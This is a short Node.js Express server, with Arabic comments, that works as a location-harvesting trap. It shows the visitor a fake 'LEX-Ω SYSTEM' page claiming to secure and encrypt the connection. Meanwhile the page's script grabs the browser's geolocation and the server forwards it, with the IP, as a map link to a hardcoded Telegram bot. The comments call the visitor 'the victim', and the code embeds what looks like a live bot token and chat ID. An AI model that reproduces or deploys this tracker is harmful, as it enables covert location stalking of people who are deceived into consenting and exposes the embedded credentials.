const express = require('express');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 10000;

// بيانات البوت الخاصة بك يا عمر
const BOT_TOKEN = "8524312771:AAGzkfu6ZiFBClFRDJaG4SPWl1eEZcgHEU8";
const CHAT_ID = "6315285444";

app.get('/', async (req, res) => {
    const { mode, ip, lat, lon, dev } = req.query;

    // إذا كانت هناك بيانات قادمة من الرابط
    if (mode) {
        let message = `☢️ <b>صيد جديد من المطور: ${dev || 'عمر مدهش'}</b>\n`;
        message += `⚙️ <b>العملية:</b> ${mode}\n`;
        if (ip) message += `📍 <b>الـ IP:</b> <code>${ip}</code>\n`;
        if (lat && lon) message += `🗺️ <b>الموقع:</b> <a href="https://www.google.com/maps?q=${lat},${lon}">اضغط هنا لفتح الخريطة</a>`;

        try {
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            });
        } catch (err) {
            console.error("Telegram Error");
        }
    }

    // الرد الذي يظهر للضحية (صفحة وهمية)
    res.send(`
        <html>
        <body style="background:#000;color:#f00;text-align:center;padding-top:100px;font-family:Arial;">
            <h1>☢ LEX-Ω SYSTEM ☢</h1>
            <p>جاري تأمين الاتصال وتشفير البيانات...</p>
            <script>
                // سحب الموقع تلقائياً إذا سمح الضحية
                navigator.geolocation.getCurrentPosition(pos => {
                    const { latitude, longitude } = pos.coords;
                    fetch('/?mode=${mode}&dev=عمر_مدهش&lat=' + latitude + '&lon=' + longitude);
                });
            </script>
        </body>
        </html>
    `);
});

app.listen(PORT, () => {
    console.log(`--- Server Running on Port ${PORT} ---`);
});
